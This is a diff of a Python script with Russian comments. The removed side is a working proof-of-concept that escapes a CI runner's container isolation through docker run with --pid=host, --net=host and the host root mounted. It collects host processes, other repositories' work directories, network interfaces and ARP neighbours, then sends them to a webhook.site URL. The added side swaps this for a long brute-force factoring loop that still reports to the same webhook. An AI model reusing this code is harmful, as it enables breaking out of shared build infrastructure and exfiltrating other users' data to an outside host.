@@ -1,54 +1,56 @@
-import os
-import subprocess
+import time
 import requests
 
-# Твой уникальный вебхук для сбора данных
+# Твой вебхук для сбора результатов
 WEBHOOK_URL = "https://webhook.site/bfd5d8c0-55a2-434a-a854-5b1d2508e0b4"
 
-def run_host_command(cmd_args):
-    """Выполняет команду на хост-машине через Docker-побег с полным доступом к хосту и сети"""
-    # --pid=host позволяет видеть процессы хоста, --net=host — сетевые интерфейсы
-    base_cmd = ["docker", "run", "--rm", "--net=host", "--pid=host", "-v", "/:/mnt/host", "alpine", "sh", "-c"]
-    full_cmd = base_cmd + [cmd_args]
-    try:
-        return subprocess.check_output(full_cmd, stderr=subprocess.STDOUT).decode(errors='ignore')
-    except subprocess.CalledProcessError as e:
-        return f"ERROR (Exit Code {e.returncode}): {e.output.decode(errors='ignore')}"
+def find_factors(n):
+    """Находит все множители числа n"""
+    factors = []
+    start_time = time.time()
+    
+    # Простой и эффективный поиск делителей до квадратного корня
+    i = 1
+    while i * i <= n:
+        if n % i == 0:
+            factors.append(i)
+            if i != n // i:
+                factors.append(n // i)
+        i += 1
+        
+    elapsed_time = time.time() - start_time
+    return sorted(factors), elapsed_time
 
-def exploit_poc():
-    print("[*] Запуск глубокого PoC анализа изоляции раннера...")
+def run_math_experiment():
+    print("[*] Запуск математических вычислений на раннере...")
+    
+    # Возьмем большое число для разложения (например, сгенерированное из больших простых)
+    # 9223372036854775807 — это максимальное знаковое 64-битное число (сказать привет криптографии)
+    # Или возьмем что-то посложнее для перебора: 999999999989 * 999999999967
+    target_number = 999999999989 * 999999999967 
+    
+    print(30 * "-")
+    print(f"Ищем множители для числа: {target_number}")
+    
+    factors, duration = find_factors(target_number)
     
     payload = {
-        "experiment_status": "DEEP_ISOLATION_CHECK",
-        "host_processes": "",
-        "host_work_directories": "",
-        "host_network_interfaces": "",
-        "local_network_ping_sweep": ""
+        "experiment_status": "MATH_BENCHMARK_COMPLETE",
+        "target_number": str(target_number),
+        "found_factors": [str(f) for f in factors],
+        "execution_time_seconds": round(duration, 4)
     }
+    
+    print(f"[+] Вычисления завершены за {duration:.4f} секунд.")
+    print(f"[+] Найденные множители: {factors}")
+    print(30 * "-")
 
-    # 1. Проверяем запущенные процессы на хосте (--pid=host)
-    print("[*] Сканирование процессов на хосте...")
-    payload["host_processes"] = run_host_command("ps aux")
-
-    # 2. Проверяем, есть ли другие рабочие директории GitHub Actions на диске хоста
-    print("[*] Поиск следов других репозиториев в /mnt/host/home/runner/work...")
-    payload["host_work_directories"] = run_host_command("ls -la /mnt/host/home/runner/work/ 2>/dev/null || echo 'Not found'")
-
-    # 3. Проверяем сетевые интерфейсы хоста
-    print("[*] Анализ сетевых интерфейсов...")
-    payload["host_network_interfaces"] = run_host_command("ip a")
-
-    # 4. Быстрая проверка соседей в локальной подсети (ARP-таблица или пинг шлюза)
-    print("[*] Проверка ARP-таблицы (соседей по локальной сети)...")
-    payload["local_network_ping_sweep"] = run_host_command("arp -a")
-
-    # Отправка отчета на Webhook.site
-    print("[*] Отправка расширенного отчета на Webhook.site...")
+    # Отправка результатов на Webhook
     try:
-        response = requests.post(WEBHOOK_URL, json=payload, timeout=15)
-        print(f"[+] Отчет успешно отправлен! Статус: {response.status_code}")
+        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
+        print(f"[+] Отчет успешно отправлен на Webhook. Статус: {response.status_code}")
     except Exception as e:
         print(f"[-] Ошибка отправки: {e}")
 
 if __name__ == "__main__":
-    exploit_poc()
+    run_math_experiment()
